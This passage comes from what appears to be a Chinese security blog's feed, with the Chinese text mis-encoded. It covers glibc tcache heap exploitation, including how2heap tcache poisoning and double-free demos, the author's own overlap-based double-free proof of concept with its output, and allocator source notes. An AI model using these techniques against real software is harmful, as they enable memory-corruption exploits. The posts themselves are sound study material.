class="comment">//å°†tc_victimé“¾å…¥tc_idxè¿™æ¡é“¾</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰bck-&gt;fd !&#x3D; victimçš„éªŒè¯æ‰€ä»¥æˆ‘ä»¬ä¼ªé€ çš„chunkä¸éœ€è¦ä¼ªé€ fdï¼Œè¿™ä¸ªæ—¶å€™è¿˜æ˜¯å…ˆè¿›è¡Œunlinkæ“ä½œï¼Œç¬¬ä¸€æ¬¡æ˜¯å¯¹chunk2è¿›è¡Œunlinkeï¼Œbckä¸ºchunk 0x7fffffffde20ï¼Œbck-&gt;fd&#x3D;binä¼šåœ¨0x7fffffffde30å†™å…¥bin(small bin)ï¼Œ<strong>è¿™å°±éœ€è¦æˆ‘ä»¬é¦–å…ˆä¿è¯è¿™ä¸ªä¼ªé€ åœ°å€çš„bkçš„fdæ˜¯å¯å†™çš„</strong></p><p>å¯ä»¥ä¸‹ä¸ªæ¡ä»¶æ–­ç‚¹çœ‹ä¸‹ watch *(long *)0x7fffffffde30 </p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328012821048.png" alt="image-20230328012821048" style="zoom:80%;"><p>ç¬¬äºŒæ¬¡å¯¹ä¼ªé€ chunk 0x7fffffffde20è¿›è¡Œunlinke bckä¸ºä¹‹å‰<strong>ç¬¬1æ­¥</strong>*ä¼ªé€ çš„0x7fffffffde30ï¼Œä¼šåœ¨0x7fffffffde40å†™å…¥bin(small bin)</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013130739.png" alt="image-20230328013130739"></p><p>ä¸ºä»€ä¹ˆè¿™é‡Œ0x7fffffffde30ä¸æ˜¯small binäº†å‘¢ï¼Ÿæ˜¯å› ä¸ºè¢«tcache_put (tc_victim, tc_idx)æŠŠ0x7fffffffde20é“¾å…¥tcachebinæ—¶æ”¹å†™äº†0x7fffffffde30å¤„çš„nextæŒ‡é’ˆ</p><p>æ¡ä»¶æ–­ç‚¹çœ‹ä¸‹å°±å¯ä»¥</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013046989.png" alt="image-20230328013046989"></p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234506290.png" alt="image-20230327234506290" style="zoom:80%;"><p>mallocï¼ˆ0x90ï¼‰æˆåŠŸç”³è¯·</p><p>ç´¯æ­»</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
            <tag> Unlink </tag>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Poisoning &amp;&amp; Tcache Dup</title>
      <link href="/2023/03/27/Tcache_poisoning_dup/"/>
      <url>/2023/03/27/Tcache_poisoning_dup/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-Poisoning"><a href="#Tcache-Poisoning" class="headerlink" title="Tcache Poisoning"></a>Tcache Poisoning</h2><p>how2heap tcache_poisoning.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// disable buffering</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">           <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">           <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_poisoning</span><br><span class="line">This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this case, the stack).</span><br><span class="line">The attack is very similar to fastbin corruption attack.</span><br><span class="line">After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><br><span class="line">We have to create and free one more chunk for padding before fd pointer hijacking.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return is 0x7fffffffe448.</span><br><span class="line">Allocating 2 buffers.</span><br><span class="line">malloc(128): 0x603260</span><br><span class="line">malloc(128): 0x6032f0</span><br><span class="line">Freeing the buffers...</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x603260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x6032f0</span><br><span class="line">to point to the location to control (0x7fffffffe448).</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x7fffffffe448 ].</span><br><span class="line">1st malloc(128): 0x6032f0</span><br><span class="line">Now the tcache list has [ 0x7fffffffe448 ].</span><br><span class="line">2nd malloc(128): 0x7fffffffe448</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure><p>è¦†ç›–tachebinçš„nextä¸ºæˆ‘ä»¬æƒ³ç”³è¯·çš„åœ°å€å³å¯</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png" alt="image-20230327091111479"></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091058041.png" alt="image-20230327091058041"></p><p>2.26ç”šè‡³æ²¡æœ‰æ£€æŸ¥tcacheçš„sizeæ˜¯å¦ç¬¦åˆè¦æ±‚</p><h2 id="Tcache-Dump"><a href="#Tcache-Dump" class="headerlink" title="Tcache Dump"></a>Tcache Dump</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span>* a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_dup</span><br><span class="line">This file demonstrates a simple double-free attack with tcache.</span><br><span class="line">Allocating buffer.</span><br><span class="line">malloc(8): 0x555555756260</span><br><span class="line">Freeing twice...</span><br><span class="line">free(): double free detected in tcache </span><br><span class="line">grxer@grxer:~$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><p>é¢ï¼Œå› ä¸ºdoublefree crashæ‰äº†ï¼Œ2.27çš„libcä¸åº”è¯¥å‘€ï¼Œæ‰¾äº†ä¸‹èµ„æ–™å‘ç°2020.9.10 2.27-3Ubuntu1.3 ç”¨glibc2.31æºç è¿›è¡Œäº†ä¸€æ³¢patch</p><p><strong>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unsortedbinæ¥overlappingï¼Œæ„é€ doublefree</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> attack[<span class="number">15</span>] = <span class="string">&quot;6666666&quot;</span>;</span><br><span class="line">    <span class="type">void</span>* fill[<span class="number">7</span>];</span><br><span class="line">    <span class="type">void</span>* unsortbin;</span><br><span class="line">    <span class="type">void</span>* tcachebin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        fill[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    unsortbin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    tcachebin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//é˜²æ­¢å’Œtopchunkåˆå¹¶</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(fill[i]);</span><br><span class="line">    <span class="built_in">free</span>(unsortbin);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="type">long</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    ptr[<span class="number">18</span>] = &amp;attack;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;hacker&quot;</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2<span class="number">.27</span>&gt; ./tcache_dup</span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure><p>å…ˆæŠŠç”³è¯·åˆ°çš„å‰ä¸ƒä¸ªå †å—é‡Šæ”¾æ‰</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140326972.png" alt="image-20230327140326972"></p><p>è¿™æ ·0x90çš„tcachebinæ»¡7ä¸ªäº†</p><p><code>free(unsortbin);</code></p><p>å°±ä¼šä¸¢è¿›unsortedbiné‡Œ</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140512916.png" alt="image-20230327140512916"></p><p><code>free(tcachebin);</code></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140608610.png" alt="image-20230327140608610"></p><p>tcachebinçš„ä½åœ°å€chunk unsortedbinæ˜¯freeçš„ï¼Œä¼šè§¦å‘unlinkæ“ä½œ</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141113916.png" alt="image-20230327141113916"></p><p><code>malloc(0x80);</code></p><p>è®©å‡ºä¸€ä¸ªtcachebin</p><p><code>free(tcachebin);</code></p><p>tcachebinè¿›å…¥tcachebin</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141335773.png" alt="image-20230327141335773"></p><p>è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†chunkçš„overlapping ï¼Œ</p><p><code>long* ptr = malloc(0xb0);</code></p><p><code>ptr[18] = &amp;attack;</code></p><p>æŠŠunsortedbinæ‹¿å‡ºæ¥,åœ¨8*18&#x3D;0x90å¤„ä¹Ÿå°±æ˜¯tcachebinçš„nextåŒºå†™å…¥æˆ‘ä»¬attackçš„æ ˆåœ°å€ï¼Œ<strong>tcache bin nextåœ°å€æŒ‡å‘çš„æ˜¯chunkçš„dataåŒºï¼Œå’ŒfastbinæŒ‡å‘chunkå¤´ä¸åŒ</strong></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327142253602.png" alt="image-20230327142253602"></p><p><code>malloc(0x80);</code><br><code>ptr = malloc(0x80);</code></p><p>ptræŒ‡å‘æˆ‘ä»¬çš„attackåœ°å€ï¼Œå¦‚æœå¼€äº†canaryï¼Œè¿™é‡Œçš„attack[15]æ•°ç»„å¤§å°è‡³å°‘ä¸º15(canaryæœ€åä¸€å­—èŠ‚ä¸º0),tcache_geté‡Œä¼š<code>e-&gt;key = NULL;</code>ä¼šç ´åæ‰canary</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
            <tag> Tcache Poisoning </tag>
            
            <tag> Tcache Dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache</title>
      <link href="/2023/03/26/Tcache/"/>
      <url>/2023/03/26/Tcache/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p><strong>Thread local caching</strong></p><p>Tcache æ˜¯ glibc <strong>2.26</strong> (ubuntu 17.10) ä¹‹åå¼•å…¥çš„ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†æå‡å †ç®¡ç†çš„æ€§èƒ½,æ€§èƒ½çš„æå‡æ€»æ˜¯ä¼´éšæ›´å¤šçš„å®‰å…¨é—®é¢˜</p><h2 id="ç›¸å…³ç»“æ„ä½“"><a href="#ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ç›¸å…³ç»“æ„ä½“"></a>ç›¸å…³ç»“æ„ä½“</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>nextæŒ‡å‘ä¸‹ä¸€ä¸ªç›¸åŒå¤§å°çš„free chunkçš„dataåŒºï¼Œè€Œä¸æ˜¯å…¶ä»–biné€šå¸¸æŒ‡å‘çš„chunkå¤´ <strong>LIFO</strong></p><p><strong>2.29</strong> ç‰ˆæœ¬ä»¥åçš„ tcache_entry å¢åŠ äº†keyå­—æ®µé˜²æ­¢doublefreeç­‰æ”»å‡» </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><strong>glibc 2.32</strong>ä»¥åè¿™é‡Œçš„nextå­—æ®µä¹Ÿä¼šä¸åŒï¼Œä¼šè¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œåé¢å†è¯´ï¼Œæœ€æ–°ç‰ˆæœ¬çš„å¯ä»¥å€¼å¥½åƒä¹Ÿè¿›è¡Œäº†åŠ å¯†</p><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>æ¯ä¸ª thread éƒ½ä¼šç»´æŠ¤ä¸€ä¸ª <code>tcache_perthread_struct</code>,é€šå¸¸æ˜¯åœ¨ç¬¬ä¸€ä¸ªå †å—,ç”¨æ¥ç®¡ç†tcache</p><p><code>counts</code> è®°å½•äº† <code>tcache_entry</code> é“¾ä¸Šç©ºé—² chunk çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunk</p><p>æœ€å¤šTCACHE_MAX_BINS 64ä¸ªtcache binä»0x20-0x410 æŒ‰0x10é€’å¢</p><h2 id="Tcache-how-2-work"><a href="#Tcache-how-2-work" class="headerlink" title="Tcache how 2 work"></a>Tcache how 2 work</h2><ol><li>ç¬¬ä¸€æ¬¡mallocï¼Œåˆ†é…ä¸€å—å†…å­˜ç»™tcache_perthread_structï¼Œç®¡ç†tcache </li><li>freeæ—¶ï¼Œsize&lt;0x410(64ä½å¸¦chunke head)æ—¶ï¼Œtcacheé“¾è¡¨å°‘äº7ä¸ªæœªæ»¡ï¼Œå…ˆæ”¾å…¥tcacehï¼Œæ»¡åå’Œä¹‹å‰ä¸€æ ·fastbinæˆ–å…¶ä»–åˆé€‚binï¼Œinuseä½ä¸ä¼šç½®é›¶ï¼Œä¸ä¼šåˆå¹¶</li><li>mallocæ—¶åœ¨tcacheèŒƒå›´å†…ï¼Œtcacheæœ‰å°±æ‹¿ï¼Œtcacheæ²¡æœ‰æ—¶ï¼Œå¦‚æœ<code>fastbin/smallbin/unsorted bin</code> ä¸­æœ‰ size ç¬¦åˆçš„ chunkï¼Œä¼šå…ˆæŠŠ <code>fastbin/smallbin/unsorted bin</code> ä¸­çš„ chunk æ”¾åˆ° tcache ä¸­ï¼Œç›´åˆ°å¡«æ»¡ã€‚ä¹‹åå†ä» tcache ä¸­å–ï¼›<strong>å› æ­¤ chunk åœ¨ å…¶ä»–bin ä¸­çš„é¡ºåºå’Œ æ‹¿åˆ°tcache ä¸­çš„é¡ºåºä¼šåè¿‡æ¥</strong></li></ol><h2 id="RTFSC"><a href="#RTFSC" class="headerlink" title="RTFSC"></a>RTFSC</h2><h3 id="ç”³è¯·"><a href="#ç”³è¯·" class="headerlink" title="ç”³è¯·"></a>ç”³è¯·</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// ä» tcache list ä¸­è·å–å†…å­˜</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// tc_idxç”± size è®¡ç®—çš„ idx åœ¨åˆæ³•èŒƒå›´å†…</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// è¯¥æ¡ tcache é“¾ä¸ä¸ºç©º</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// è¿›å…¥ä¸æ—  tcache æ—¶ç±»ä¼¼çš„æµç¨‹</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tcache-&gt;entries[tc_idx]ä¸ä¸ºç©ºæ—¶tcache_get(tc_idx)ç”³è¯·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//æŠŠæœ€æ–°çš„tcacehchunkæ‹¿å‡ºæ¥</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//åˆ¤æ–­indexåˆæ³•æ€§</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>); <span class="comment">//åˆ¤æ–­tcache biné“¾æ˜¯ä¸æ˜¯ä¸ºç©º</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//æŠŠtcache biné“¾æŒ‡å‘ä¸‹ä¸€ä¸ªchunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// è·å¾—ä¸€ä¸ª chunkï¼Œcounts å‡ä¸€</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡ ä¹æ²¡æœ‰ä¿æŠ¤</p><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"> <span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line"> &#123;</span><br><span class="line">   tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">   e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>å–å‡ºæ—¶ä¼šè¿›è¡Œxorè§£å¯†ï¼Œ2.32çš„nextä¼šé€šè¿‡PROTECT_PTRå¼‚æˆ–åŠ å¯†ï¼ŒæŠŠå­˜å‚¨nextçš„åœ°å€å³ç§»12ä½åå’Œnextå¼‚æˆ–åæŠŠè§£å¯†åœ°å€(ä¹Ÿå°±æ˜¯chunkçœŸå®åœ°å€)æ”¾åˆ°tcache structä¸­ï¼Œè¿™è®©æˆ‘ä»¬ä¹‹å‰fastbin attachç±»ä¼¼çš„ä¼ªé€ chunkåœ¨è¿™é‡Œéš¾é“å¢åŠ </p><h2 id="é‡Šæ”¾"><a href="#é‡Šæ”¾" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h2><p>_int_free()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        